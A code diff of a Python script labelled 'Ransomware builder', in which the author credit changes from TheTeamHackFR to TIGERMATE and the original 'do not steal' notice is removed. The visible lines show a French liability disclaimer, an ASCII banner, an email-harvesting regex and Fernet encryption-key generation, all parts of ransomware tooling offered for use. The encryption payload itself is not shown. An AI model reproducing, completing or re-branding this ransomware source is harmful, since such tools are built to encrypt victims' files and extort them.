@@ -1,10 +1,8 @@
 #####################################
 # CE PROGRAMME A ETE ENTIEREMENT
-# CODE PAR THETEAMHACKFR
-# MERCI DE NE PAS LE VOLER OU DE LE
-# SKIDDER
+# CODE BY TIGERMATE
 #
-# TheTeamHackFR
+# NASAHACKER.COM
 #####################################
 
 from time import sleep
@@ -17,7 +15,7 @@ import re
 choice = input ("NOUS NE SOMMES PAS RESPONSABLE DE VOS ACTES (veuillez écrire o si vous êtes d'accord avec sa) : ")
 
 if choice == "o":
-    print("""                       ████████████      
+    print("""          ████████████      
                      ████████████████    
                    ██████        ██████  
                    ████            ████  
@@ -35,7 +33,7 @@ if choice == "o":
                  ████████████████████████
 
                               
-                 Ransomware builder by TheTeamHackFR""")
+                 Ransomware builder by TIGERMATE""")
 
     regex = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
     kEy = Fernet.generate_key()
